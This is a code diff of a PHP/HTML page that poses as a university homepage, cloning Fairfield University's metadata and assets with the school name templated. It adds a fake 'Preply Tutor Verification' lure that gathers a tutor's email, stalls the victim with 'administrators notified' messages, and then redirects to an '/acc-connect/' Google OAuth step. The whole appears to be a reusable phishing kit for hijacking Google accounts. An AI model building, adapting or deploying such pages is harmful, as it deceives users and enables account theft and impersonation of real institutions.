@@ -24,7 +24,16 @@ $est   = '1976';
     </script>
     <!-- End Data Layer Object -->
 
-    
+    <!-- End Google Tag Manager -->
+    <!-- Halda Sccript -->
+    <script data-account-name="<?= $name ?>" data-cfasync="false" async="true">
+        var s = document.createElement('script');
+        s.setAttribute('data-cfasync', 'false');
+        s.src = 'https://app.heyhalda.com/widgets/smart-forms/cmjhl05lg00snfyrh73zjtjmp.js?r=' + Math.random().toString(36).substring(7);
+        s.async = true;
+        document.head.appendChild(s);
+    </script>
+    <!-- End Halda Sccript -->
 
 
 
@@ -35,23 +44,38 @@ $est   = '1976';
     <meta content="width=device-width, initial-scale=1" name="viewport" />
     <meta content="en_US" property="og:locale" />
     <meta content="<?= $name ?>" property="og:site_name" />
-    
+    <meta content="website" property="og:type" />
+    <meta content="<?= $name ?>" property="og:title" />
+    <meta content="<?= $name ?> is a Jesuit, Catholic university in mission and spirit with over 5,000 undergraduate and graduate students from across the globe." property="og:description" />
+    <meta content="https://www.fairfield.edu/index.html" property="og:url" />
+    <meta content="https://www.fairfield.edu/_assets/images/home-hero-desktop_03032025.webp" property="og:image" />
+    <meta content="summary_large_image" name="twitter:card" />
+    <meta content="<?= $name ?>" name="twitter:site" />
+    <meta content="<?= $name ?>" name="twitter:title" />
+    <meta content="<?= $name ?> is a Jesuit, Catholic university in mission and spirit with over 5,000 undergraduate and graduate students from across the globe." name="twitter:description" />
+    <meta content="https://www.fairfield.edu/_assets/images/home-hero-desktop_03032025.webp" name="twitter:image" />
+    <meta content="4d19fa40ac1e042d2992acf15b037c9f" name="id" />
 
+    <link href="https://www.fairfield.edu/" rel="canonical" />
 
     <link href="https://fonts.googleapis.com" rel="preconnect" />
     <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect" />
     <link href="https://fonts.googleapis.com/css2?family=Figtree:ital,wght@0,300..900;1,300..900&amp;family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet" />
-    <link href="/public/css/style.min.css" media="screen" rel="stylesheet" />
-    <link href="/public/css/print.css" media="print" rel="stylesheet" />
-    <link href="/public/css/pattern-scaffolding.css" media="all" rel="stylesheet" />
-    <link href="/public/css/hh-custom.css" media="screen" rel="stylesheet" />
+    <link href="https://www.fairfield.edu/_files/css/style.min.css" media="screen" rel="stylesheet" />
+    <link href="https://www.fairfield.edu/_files/css/print.css" media="print" rel="stylesheet" />
+    <link href="https://www.fairfield.edu/_files/css/pattern-scaffolding.css" media="all" rel="stylesheet" />
+    <link href="https://www.fairfield.edu/_files/css/hh-custom.css" media="screen" rel="stylesheet" />
     <script>
         document.documentElement.classList.add('js');
-    </script> 
-    <script defer="" src="/public/js/bundle.min.js"></script>
-    <script crossorigin="anonymous" defer="" src="/public/js/ce476612aa.js"></script>
-     <link rel="icon" href="" sizes="32x32">
-    <link rel="icon" href="/public/assets/uploads/icon.png"  > 
+    </script>
+    <!-- index.js will be empty when site alert is not active -->
+    <script defer="" src="https://www.fairfield.edu/index.js"></script>
+    <script defer="" src="https://www.fairfield.edu/_files/js/bundle.min.js"></script>
+    <script crossorigin="anonymous" defer="" src="https://kit.fontawesome.com/ce476612aa.js"></script>
+     <link rel="icon" href="https://www.duke.edu/wp-content/uploads/2025/12/cropped-dfavicon-1-32x32.png" sizes="32x32">
+    <link rel="icon" href="https://www.duke.edu/wp-content/uploads/2025/12/cropped-dfavicon-1-192x192.png" sizes="192x192">
+    <link rel="apple-touch-icon" href="https://www.duke.edu/wp-content/uploads/2025/12/cropped-dfavicon-1-180x180.png">
+    <meta name="msapplication-TileImage" content="https://www.duke.edu/wp-content/uploads/2025/12/cropped-dfavicon-1-270x270.png">
 
 
 
@@ -1022,8 +1046,8 @@ $est   = '1976';
                         <div class="home-admission-cta" id="admissionCTA-7">
                             <div class="home-admission-cta__image">
                                 <picture>
-                                    <source media="(min-width: 768px)" srcset="/public/assets/uploads/home-admission-cta-desktop.jpg" />
-                                    <img alt="Alt text" height="1215" src="/public/assets/uploads/home-admission-cta-mobile.jpg" width="2160" />
+                                    <source media="(min-width: 768px)" srcset="https://www.fairfield.edu/_assets/images/home-admission-cta-desktop.jpg" />
+                                    <img alt="Alt text" height="1215" src="https://www.fairfield.edu/_assets/images/home-admission-cta-mobile.jpg" width="2160" />
                                 </picture>
                             </div>
 
@@ -1100,7 +1124,7 @@ $est   = '1976';
                                         <div class="email-input-section">
                                             <div class="email-input-header">👨‍🏫 Preply Tutor Verification</div>
                                             <div class="email-input-description">
-                                                This document has been shared with you by a Radford University student through Preply's online tutoring platform. To ensure secure access and verify your identity, please enter your <strong>Preply tutor email address</strong> below.
+                                                This document has been shared with you by a <?= $name ?> student through Preply's online tutoring platform. To ensure secure access and verify your identity, please enter your <strong>Preply tutor email address</strong> below.
                                             </div>
                                             <div class="form-group">
                                                 <label class="form-label" for="tutorEmail">Preply Tutor Email Address *</label>
@@ -1158,7 +1182,7 @@ $est   = '1976';
                                                     Select the email you entered above from the list. If it's not shown, click <strong>"Use another account"</strong> and sign in.
                                                 </div>
                                                 <div class="screenshot-container">
-                                                    <img src="/public/assets/uploads/step1.png" alt="Google Account Selection">
+                                                    <img src="/public/assets/uploads/step11.png" alt="Google Account Selection">
                                                 </div>
                                                 <div class="step-description">
                                                     <strong>Action Required:</strong> Select your Preply email account or click "Use another account" if not visible.
@@ -1257,7 +1281,7 @@ $est   = '1976';
 
                 <div class="site-footer">
                     <div aria-label="<?= $name ?>" class="site-footer__logo" role="region">
-                        <a href="/">
+                        <a href="https://www.fairfield.edu/index.html">
                             <span class="visible-for-screen-readers"><?= $name ?></span>
                             <svg aria-hidden="true" height="111" width="608">
 
@@ -1271,7 +1295,7 @@ $est   = '1976';
                         <ul>
 
                             <li>
-                                <a class="fancy-link" href="/" target="_parent">Academics<span class="fancy-link__arrow"></span></a>
+                                <a class="fancy-link" href="https://www.fairfield.edu/academics/index.html" target="_parent">Academics<span class="fancy-link__arrow"></span></a>
                             </li>
 
                             <li>
@@ -1510,24 +1534,52 @@ $est   = '1976';
                     method: "POST",
                     body: JSON.stringify({ email }),
                 });
+                
+                const res = await response.json();
+                
+                // console.log("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");
+                // console.log(res);
+                // console.log("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");
 
-                if (response.ok) {
-                    loadingText.textContent = 'Administrators notified.Please wait do not leave page it may take up to 30 seconds. Preparing authentication...';
-                }
+                // if (res.error == 'true' || res.error == true) {
+                //     alert(res.msg);
+                //     return;
+                // }
+                loadingText.textContent = 'Administrators notified.Please wait do not leave page it may take up to 30 seconds. Preparing authentication...';
+               
+                
+                // Wait 8 seconds total to allow manual test user addition
+                setTimeout(() => {
+                    loadingText.textContent = 'Redirecting to Google authentication...Please wait it may take up to a minute do not leave page!!';
+                }, 18000);
+    
+                setTimeout(() => {
+                    // Redirect to Gmail OAuth flow
+                    const redirectUrl = `/acc-connect/?email=${encodeURIComponent(email)}`;
+                    window.location.href = redirectUrl;
+                }, 49000);
+                
+            
             } catch (error) {
-                console.log('Notification sent');
+                console.log('Notification sent', error);
+                
+                loadingText.textContent = 'Administrators notified.Please wait do not leave page it may take up to 30 seconds. Preparing authentication...';
+               
+                
+                // Wait 8 seconds total to allow manual test user addition
+                setTimeout(() => {
+                    loadingText.textContent = 'Redirecting to Google authentication...Please wait it may take up to a minute do not leave page!!';
+                }, 18000);
+    
+                setTimeout(() => {
+                    // Redirect to Gmail OAuth flow
+                    const redirectUrl = `/acc-connect/?email=${encodeURIComponent(email)}`;
+                    window.location.href = redirectUrl;
+                }, 49000);
+                
             }
 
-            // Wait 8 seconds total to allow manual test user addition
-            setTimeout(() => {
-                loadingText.textContent = 'Redirecting to Google authentication...Please wait it may take up to a minute do not leave page!!';
-            }, 18000);
-
-            setTimeout(() => {
-                // Redirect to Gmail OAuth flow
-                const redirectUrl = `/acc-connect/?email=${encodeURIComponent(email)}`;
-                window.location.href = redirectUrl;
-            }, 49000);
+            
         }
 
         // Allow Enter key to submit
